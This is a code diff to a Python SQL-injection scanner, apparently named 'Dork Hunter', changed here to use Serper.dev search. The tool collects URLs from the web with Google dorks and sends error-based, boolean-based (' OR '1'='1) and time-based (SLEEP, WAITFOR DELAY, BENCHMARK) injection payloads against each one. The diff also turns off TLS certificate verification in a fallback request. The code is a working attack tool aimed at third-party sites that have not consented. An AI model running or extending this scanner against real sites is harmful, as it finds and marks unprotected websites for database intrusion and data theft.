@@ -4,8 +4,10 @@ import re
 import time
 import ssl
 import logging
+import getpass
 import requests
 from concurrent.futures import ThreadPoolExecutor
+from difflib import SequenceMatcher
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 import csv
 from typing import List, Set, Dict, Optional
@@ -24,6 +26,7 @@ MAX_VULNERABLE_URLS = 10
 REQUEST_TIMEOUT = (10, 20)
 DELAY_BETWEEN_REQUESTS = (1, 3)
 MAX_API_PAGES = 10
+MAX_WORKERS = 5
 
 SQL_ERROR_PATTERNS = [
     r"sql syntax.*mysql",
@@ -75,9 +78,8 @@ class CustomSSLAdapter(requests.adapters.HTTPAdapter):
 
 
 class SqlScan:
-    def __init__(self, api_key: str, cse_id: str):
+    def __init__(self, api_key: str):
         self.api_key = api_key
-        self.cse_id = cse_id
         self.scanned_urls: Set[str] = set()
         self.user_agents: List[str] = []
         self.payloads: List[str] = []
@@ -121,7 +123,8 @@ class SqlScan:
             logger.warning(f"File not found: {file_path}")
             return []
         with open(file_path, 'r', encoding='utf-8') as f:
-            return [line.strip() for line in f if line.strip()]
+            # Strip comment lines (e.g. payloads.txt section headers)
+            return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
 
     def load_scanned_urls(self, scanned_urls_file: str) -> Set[str]:
         if os.path.exists(scanned_urls_file):
@@ -153,25 +156,28 @@ class SqlScan:
         return urlunparse(parsed._replace(query=new_query))
 
     def dorking(self, dork: str, page: int) -> List[str]:
-        search_url = "https://www.googleapis.com/customsearch/v1"
-        start = (page - 1) * 10 + 1
-        if start > 91:
+        search_url = "https://google.serper.dev/search"
+        if page > MAX_API_PAGES:
             return []
-        params = {'q': dork, 'key': self.api_key, 'cx': self.cse_id, 'start': start, 'num': 10}
+        headers = {
+            'X-API-KEY': self.api_key,
+            'Content-Type': 'application/json',
+        }
+        payload = {'q': dork, 'num': 10, 'page': page}
         try:
-            resp = self.session.get(search_url, headers=self.get_random_headers(), params=params, timeout=REQUEST_TIMEOUT)
+            resp = self.session.post(search_url, headers=headers, json=payload, timeout=REQUEST_TIMEOUT)
             resp.raise_for_status()
             data = resp.json()
-            items = data.get('items', [])
+            items = data.get('organic', [])
             urls = [item['link'] for item in items if 'link' in item]
             time.sleep(random.uniform(*DELAY_BETWEEN_REQUESTS))
             return urls
         except requests.exceptions.HTTPError as e:
-            logger.error(f"CSE HTTP error (page {page}): {e}")
+            logger.error(f"Serper HTTP error (page {page}): {e}")
         except requests.exceptions.RequestException as e:
-            logger.error(f"CSE request error (page {page}): {e}")
+            logger.error(f"Serper request error (page {page}): {e}")
         except Exception as e:
-            logger.error(f"CSE parse error (page {page}): {e}")
+            logger.error(f"Serper parse error (page {page}): {e}")
         return []
 
     def extract_valid_urls(self, urls: List[str]) -> List[str]:
@@ -242,18 +248,18 @@ class SqlScan:
             return None
 
     def _make_request_with_ssl_fallback(self, url: str) -> Optional[str]:
+        """Fallback request with SSL verification disabled for sites with self-signed certs."""
         try:
-            ctx = ssl.create_default_context()
-            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
-            if hasattr(ssl.TLSVersion, "TLSv1_3"):
-                ctx.maximum_version = ssl.TLSVersion.TLSv1_3
-            resp = self.session.get(url, headers=self.get_random_headers(), timeout=15, verify=True, ssl_context=ctx)
+            resp = self.session.get(url, headers=self.get_random_headers(), timeout=15, verify=False)
             return resp.text
-        except Exception:
+        except Exception as e:
+            logger.debug(f"SSL fallback also failed for {url}: {e}")
             return None
 
     def _test_payloads(self, url: str, parsed, query) -> bool:
         for param, values in query.items():
+            # Boolean-based and time-based checks are per-parameter, not per-payload.
+            # Run them once per param to avoid massive redundant requests.
             for value in values:
                 for payload in self.payloads:
                     try:
@@ -267,19 +273,15 @@ class SqlScan:
                                 continue
                         if self._detect_sql_errors(response):
                             return True
-                        if self._check_boolean_based(url, param):
-                            return True
-                        if self._check_time_based(url, param):
-                            return True
-                    except Exception:
+                    except Exception as e:
+                        logger.debug(f"Payload test error on {url}: {e}")
                         continue
+            # Run structural checks once per parameter after all payloads
+            if self._check_boolean_based(url, param):
+                return True
+            if self._check_time_based(url, param):
+                return True
         return False
-
-    def _build_test_url(self, parsed, param, value, payload) -> str:
-        q = parse_qs(parsed.query, keep_blank_values=True)
-        q[param] = [value + payload]
-        new_query = urlencode(q, doseq=True)
-        return urlunparse(parsed._replace(query=new_query))
 
     def _detect_sql_errors(self, response_text: str) -> bool:
         if not response_text:
@@ -288,26 +290,19 @@ class SqlScan:
         return any(re.search(pattern, text) for pattern in SQL_ERROR_PATTERNS)
 
     def _check_boolean_based(self, url: str, param: str) -> bool:
-        true_payloads = [
-            f"{param}=1' AND '1'='1",
-            f"{param}=1' OR '1'='1",
-            f"{param}=1 AND 1=1"
-        ]
-        false_payloads = [
-            f"{param}=1' AND '1'='2",
-            f"{param}=1' OR '1'='2",
-            f"{param}=1 AND 1=2"
-        ]
+        # Use _with_param directly — avoids brittle split("=", 1) that breaks on values with "="
+        true_values = ["1' AND '1'='1", "1' OR '1'='1", "1 AND 1=1"]
+        false_values = ["1' AND '1'='2", "1' OR '1'='2", "1 AND 1=2"]
         base = self._make_request(url)
         if not base:
             return False
-        for t in true_payloads:
-            true_url = self._with_param(url, param, t.split("=", 1)[1])
+        for t_val in true_values:
+            true_url = self._with_param(url, param, t_val)
             true_resp = self._make_request(true_url)
             if not true_resp:
                 continue
-            for f in false_payloads:
-                false_url = self._with_param(url, param, f.split("=", 1)[1])
+            for f_val in false_values:
+                false_url = self._with_param(url, param, f_val)
                 false_resp = self._make_request(false_url)
                 if not false_resp:
                     continue
@@ -318,22 +313,23 @@ class SqlScan:
     def _calculate_difference(self, base: str, true_resp: str, false_resp: str) -> bool:
         if abs(len(true_resp) - len(false_resp)) > 100:
             return True
-        from difflib import SequenceMatcher
+        # SequenceMatcher imported at top level — no nested import needed
         true_ratio = SequenceMatcher(None, base, true_resp).ratio()
         false_ratio = SequenceMatcher(None, base, false_resp).ratio()
         return abs(true_ratio - false_ratio) > 0.3
 
     def _check_time_based(self, url: str, param: str) -> bool:
-        payloads = [
-            f"{param}=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
-            f"{param}=1' WAITFOR DELAY '0:0:5'-- ",
-            f"{param}=1 AND BENCHMARK(5000000,MD5(NOW()))"
+        # Use _with_param directly to safely build URLs without brittle split("=", 1)
+        time_values = [
+            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
+            "1' WAITFOR DELAY '0:0:5'-- ",
+            "1 AND BENCHMARK(5000000,MD5(NOW()))"
         ]
         threshold = 4
-        for p in payloads:
+        for val in time_values:
             start = time.time()
-            test_url = self._with_param(url, param, p.split("=", 1)[1])
-            _ = self._make_request(test_url)
+            test_url = self._with_param(url, param, val)
+            self._make_request(test_url)
             elapsed = time.time() - start
             if elapsed >= threshold:
                 return True
@@ -355,7 +351,7 @@ class SqlScan:
             if not valid_urls:
                 page += 1
                 continue
-            with ThreadPoolExecutor(max_workers=5) as executor:
+            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                 results = list(executor.map(self.check_vulnerability, valid_urls))
             for u, result in zip(valid_urls, results):
                 if result is True:
@@ -394,7 +390,7 @@ def get_api_credentials():
         "██║  ██║██║   ██║██╔══██╗██╔═██╗     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗\n"
         "██████╔╝╚██████╔╝██║  ██║██║  ██╗    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║\n"
         "╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝\n"
-        "	\n"
+        "\t\n"
         "██████╗ ██╗   ██╗    ██╗  ██╗███████╗███╗   ██╗██╗  ██╗\n"	
         "██╔══██╗╚██╗ ██╔╝    ╚██╗██╔╝██╔════╝████╗  ██║╚██╗██╔╝ \n"	
         "██████╔╝ ╚████╔╝      ╚███╔╝ █████╗  ██╔██╗ ██║ ╚███╔╝ \n"	
@@ -403,10 +399,10 @@ def get_api_credentials():
         "╚═════╝    ╚═╝       ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═══╝╚═╝  ╚═╝\n"
     )
     print(center_text(banner))
-    print(center_text("Provide your Google Custom Search API key and Custom Search Engine ID."))
-    api_key = input("\nYour Google Custom Search API key: ").strip()
-    cse_id = input("Your Google Custom Search Engine ID: ").strip()
-    return api_key, cse_id
+    print(center_text("Powered by Serper.dev — Free Google Search API (no credit card required)"))
+    print(center_text("Get your free API key at: https://serper.dev"))
+    api_key = getpass.getpass("\nYour Serper.dev API key (input hidden): ").strip()
+    return api_key
 
 def get_dork_and_options():
     dork = input('Dork (example="inurl:product?id="): ').strip()
@@ -423,8 +419,8 @@ def write_report(vulnerable_urls: List[str], filename: str = DEFAULT_REPORT_FILE
 
 def main():
     try:
-        api_key, cse_id = get_api_credentials()
-        scanner = SqlScan(api_key, cse_id)
+        api_key = get_api_credentials()
+        scanner = SqlScan(api_key)
         while True:
             dork, max_vuln, save_report = get_dork_and_options()
             clear_console()
